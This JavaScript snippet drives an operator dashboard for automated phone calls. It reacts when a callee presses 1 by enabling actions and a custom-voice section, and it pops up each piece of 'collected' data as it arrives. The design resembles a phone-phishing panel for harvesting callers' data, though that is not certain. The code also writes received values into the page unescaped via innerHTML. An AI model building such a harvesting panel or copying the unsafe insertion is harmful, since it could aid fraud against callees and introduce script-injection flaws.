// Listen for user consent (press 1)
socket.on('user_consent', (data) => {
    addLog(`User pressed 1 - Ready for data collection`, 'success');
    playNotificationSound();
    
    // Enable all action buttons
    document.querySelectorAll('.action-btn').forEach(btn => {
        btn.disabled = false;
        btn.style.opacity = '1';
        btn.style.cursor = 'pointer';
    });
    
    // Show custom voice section
    document.getElementById('customVoiceSection').style.display = 'block';
    
    // Update active call status
    const activeCallDiv = document.getElementById('activeCallInfo');
    if (activeCallDiv) {
        activeCallDiv.innerHTML = `
            <div class="call-info-details">
                <div>
                    <div class="name">${data.session_id ? 'Call Active' : 'User Ready'}</div>
                    <div class="phone">Ready for requests - Press 1 received</div>
                </div>
                <div class="call-status">
                    <i class="fas fa-check-circle"></i>
                    <span>Consent Given</span>
                </div>
            </div>
        `;
    }
});

// Update the data_collected event to play sound and show instantly
socket.on('data_collected', (data) => {
    addLog(`Data received: ${data.type} = ${data.value}`, 'success');
    playNotificationSound();
    loadContacts(); // Refresh the table
    
    // Show popup notification
    const notification = document.createElement('div');
    notification.className = 'data-notification';
    notification.innerHTML = `
        <i class="fas fa-database"></i>
        ${data.type.toUpperCase()}: ${data.value}
    `;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
});
